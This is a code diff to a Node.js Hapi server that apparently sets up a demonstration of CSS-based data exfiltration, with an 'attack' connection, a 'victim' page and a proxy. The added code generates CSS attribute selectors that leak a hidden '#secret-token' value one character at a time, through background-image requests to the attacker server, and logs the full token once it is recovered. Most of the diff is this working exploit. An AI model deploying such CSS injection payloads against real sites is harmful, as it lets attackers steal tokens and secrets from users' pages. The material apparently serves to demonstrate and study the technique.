@@ -1,9 +1,19 @@
 'use strict';
 
+const Path = require('path');
 const Hapi = require('hapi');
 
-const server = new Hapi.Server();
-server.connection({
+const server = new Hapi.Server({
+    connections: {
+        routes: {
+            files: {
+                relativeTo: Path.join(__dirname)
+            }
+        }
+    }
+});
+
+const demo1Connection = server.connection({
     port: 3000,
     host: '0.0.0.0',
     routes: {
@@ -25,7 +35,7 @@ const cookieConfig = {
     strictHeader: false // don't allow violations of RFC 6265
 }
 
-server.state('chars', cookieConfig);
+demo1Connection.state('chars', cookieConfig);
 
 
 
@@ -72,7 +82,7 @@ function createFontFacesForHex() {
 
 
 
-server.route({
+demo1Connection.route({
     method: 'GET',
     path: '/first-pass.css',
     handler: function (request, reply) {
@@ -91,7 +101,7 @@ ${fonts}
 
 let chars = [];
 setInterval(() => chars = [], 1000);
-server.route({
+demo1Connection.route({
     method: 'GET',
     path: '/char/{char}',
     handler: function (request, reply) {
@@ -101,10 +111,137 @@ server.route({
     }
 });
 
-server.start((err) => {
+
+
+
+
+
+const attackConnection = server.connection({
+    port: 3001,
+    host: '0.0.0.0',
+    routes: {
+        cors: true,
+        state: {
+            parse: true,
+            failAction: 'ignore',
+        }
+    },
+});
+
+const victimServer = server.connection({
+    port: 3002,
+    host: '0.0.0.0',
+    routes: {
+        cors: true,
+        state: {
+            parse: true,
+            failAction: 'ignore',
+        }
+    },
+});
+
+attackConnection.state('foundToken', cookieConfig);
+
+const MAX_TOKEN_LENGTH = 10;
+let foundToken = '';
+
+function createAttributeSelectorFor(char) {
+    return `
+#secret-token[value^=${foundToken}${char}] {
+    background-image: url(http://localhost:3001/token/${foundToken}${char});
+}
+    `.trim();
+}
+
+function createAttributeSelectors() {
+    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+    let result = '';
+    for (const char of chars) {
+        result += createAttributeSelectorFor(char) + '\n';
+    }
+    return result;
+}
+
+attackConnection.route({
+    method: 'GET',
+    path: '/first-pass.css',
+    handler: function (request, reply) {
+        reply(createAttributeSelectors().trim()).type('text/css')
+    }
+});
+
+attackConnection.route({
+    method: 'GET',
+    path: '/token/{token}',
+    handler: function (request, reply) {
+        foundToken = request.params.token;
+        if (foundToken.length === MAX_TOKEN_LENGTH) {
+            console.log('FOUND: ', foundToken);
+        }
+        reply(``);
+    }
+});
+
+attackConnection.route({
+    method: 'GET',
+    path: '/iframe',
+    handler(request, reply) {
+        if (foundToken.length === MAX_TOKEN_LENGTH) {
+            reply(`<h1>${foundToken}</h1>`).state('foundToken', '');
+            foundToken = '';
+        } else {
+            reply.view('iframe2', { foundToken }).state('foundToken', foundToken);
+        }
+    }
+});
+
+victimServer.route({
+    method: 'GET',
+    path: '/',
+    handler(request, reply) {
+        reply.file('vulnerablesite2.html');
+    }
+});
+
+
+server.register([require('inert'), require('vision'), require('h2o2')], (err) => {
     if (err) {
         throw err;
     }
-    console.log(`Server running at: ${server.info.uri}`);
+
+    const lmgtfyConnection = server.connection({
+        port: 3003,
+        host: '0.0.0.0',
+        routes: {
+            cors: true
+        },
+    });
+
+    lmgtfyConnection.route({
+        method: 'GET',
+        path: '/{path*}',
+        handler: {
+            proxy: {
+                uri: 'http://lmgtfy.com/{path}'
+            }
+        }
+    });
+
+    server.views({
+        engines: {
+            html: require('handlebars')
+        },
+        relativeTo: __dirname
+    });
+
+    server.start((err) => {
+        if (err) {
+            throw err;
+        }
+
+        server.connections.forEach(connection => {
+            console.log('Server started at: ' + connection.info.uri);
+        });
+    });
 });
 
